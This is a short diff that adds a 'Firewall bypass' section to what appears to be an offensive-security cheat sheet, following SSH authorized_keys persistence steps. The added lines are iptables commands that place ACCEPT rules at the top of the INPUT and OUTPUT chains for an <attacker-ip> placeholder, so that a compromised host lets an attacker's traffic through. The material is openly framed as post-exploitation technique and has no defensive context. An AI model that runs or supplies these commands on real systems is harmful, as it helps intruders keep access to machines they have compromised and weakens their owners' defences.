@@ -30,3 +30,18 @@ chmod 600 ~/.ssh/authorized_keys
 # connecting remote target host
 ssh -i id_rsa username@target.com
 ```
+## Firewall bypass root privileges
+```bash
+# List the iptables settings
+iptables --list
+
+# ACCEPT: TARGET => ATTACKER
+# OUTPUT 1: The first rule of the OUTPUT chain.
+# -d: Destination address
+iptables -I OUTPUT 1 -p tcp -d <attacker-ip> -j ACCEPT
+
+# ACCEPT: TARGET <= ATTACKER
+# INPUT 1: The first rule of the INPUT chain.
+# -s: Source address
+iptables -I INPUT 1 -p tcp -s <attacker-ip> -j ACCEPT
+```
